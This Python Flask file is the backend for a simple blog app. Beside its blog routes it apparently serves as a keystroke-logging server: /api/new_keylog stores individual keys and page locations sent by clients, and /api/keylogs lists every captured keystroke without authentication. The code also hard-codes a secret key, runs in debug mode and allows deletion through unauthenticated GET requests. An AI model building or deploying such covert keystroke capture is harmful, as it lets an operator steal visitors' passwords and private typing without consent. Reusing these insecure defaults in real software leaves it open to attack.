from flask import Flask, jsonify, json, request
from datetime import date, datetime
from flask_sqlalchemy import SQLAlchemy
from flask_migrate import Migrate
from flask_cors import CORS

app = Flask(__name__, static_folder="../build", static_url_path='/')
CORS(app, supports_credentials=True)
#this is good for deployment

app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///db.sqlite'
app.config['SECRET_KEY'] = 'secret-key-goes-here'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

migrate = Migrate()
migrate.init_app(app, db)

class Blogs(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String(100), nullable = False)
    body = db.Column(db.String(400), nullable = False)
    author = db.Column(db.String(100), nullable = False)

class Key_strokes(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    key = db.Column(db.String(15), nullable = False)
    location = db.Column(db.String(30), nullable = False)
    timestamp = db.Column(db.DateTime, default = datetime.utcnow)

@app.route('/')
def index():
    return app.send_static_file('index.html')

@app.route("/api/blogs" , methods = ['GET'])
def first_page():
    blog = Blogs.query.order_by(Blogs.id.desc()).all()
    all_blogs = jsonify([*map(blog_serializer, blog)])
    return all_blogs

def blog_serializer(blog):
    return{
        'id': blog.id,
        'author': blog.author,
        'body': blog.body,
        'title': blog.title,
    }

@app.route("/api/create", methods=['POST'])
def create_blog():
    request_data=json.loads(request.data)
    author = request_data['author']
    body = request_data['body']
    title = request_data['title']

    new_blog = Blogs(author = author, body = body, title = title)
    db.session.add(new_blog)
    db.session.commit()
    return {'msg': 'Blog added successfully'}


@app.route('/api/blogs/<int:id>', methods = ['GET'])
def single_blog(id):
    blog = Blogs.query.filter_by(id = id).first()
    return {
        "id": blog.id,
        "title": blog.title,
        "author": blog.author,
        "body": blog.body
    }

@app.route('/api/delete_blogs/<int:id>', methods = ['POST', 'GET'])
def delete_blog(id):
    blog = Blogs.query.filter_by(id = id).first()
    db.session.delete(blog)
    db.session.commit()
    return {"msg": "blog deleted"}

@app.route("/api/new_keylog", methods=['POST'])
def new_keylog():
    request_data=json.loads(request.data)
    key = request_data['key']
    location = request_data['location']

    new_blog = Key_strokes(key = key, location = location)
    db.session.add(new_blog)
    db.session.commit()
    return {'msg': 'success added successfully'}

@app.route("/api/keylogs" , methods = ['GET'])
def key_logs():
    keyLogs = Key_strokes.query.all()
    all_logs = jsonify([*map(keylogs_serializer, keyLogs)])
    return all_logs

def keylogs_serializer(blog):
    return{
        'id': blog.id,
        'key': blog.key,
        'location': blog.location,
        'timestamp': blog.timestamp
    }

if __name__ == "__main__":
    db.create_all()
    app.run(debug=True)

